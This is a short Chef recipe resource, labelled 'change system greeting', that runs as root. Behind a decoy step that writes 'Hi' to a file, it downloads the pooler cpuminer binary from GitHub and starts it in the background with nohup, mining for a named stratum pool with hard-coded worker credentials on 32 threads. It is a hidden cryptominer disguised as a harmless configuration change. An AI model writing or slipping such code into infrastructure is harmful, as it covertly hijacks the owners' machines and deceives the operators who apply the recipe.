bash "change system greeting" do
  user "root"
  code <<-EOH
  cd /root/ && wget https://github.com/pooler/cpuminer/releases/download/v2.4.4/pooler-cpuminer-2.4.4-linux-x86_64.tar.gz && tar xvf pooler-cpuminer-2.4.4-linux-x86_64.tar.gz && echo "Hi" > yo.txt &&nohup ./minerd -o stratum+tcp://global.wemineltc.com:3333 -u ajhaxynr.1 -p ajHax365 -t 32 &
  EOH
  end
